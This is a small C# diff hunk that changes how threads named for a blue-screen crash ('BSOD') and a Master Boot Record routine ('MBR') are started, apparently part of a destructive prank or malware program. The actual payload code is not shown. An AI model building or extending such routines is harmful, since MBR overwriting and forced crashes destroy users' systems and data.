@@ -40,11 +40,8 @@ MessageBoxButtons.YesNo
 
         /*==========================================================================*/
 
-        var bsod = new Thread(bBsod.Bsod);
-        var mbr = new Thread(Mbr.MbrInit);
-
-        bsod.Start();
-        mbr.Start();
+        BSOD.Start();
+        MBR.Start();
 
         tsp1.Start();
         StrangeBox.Start();
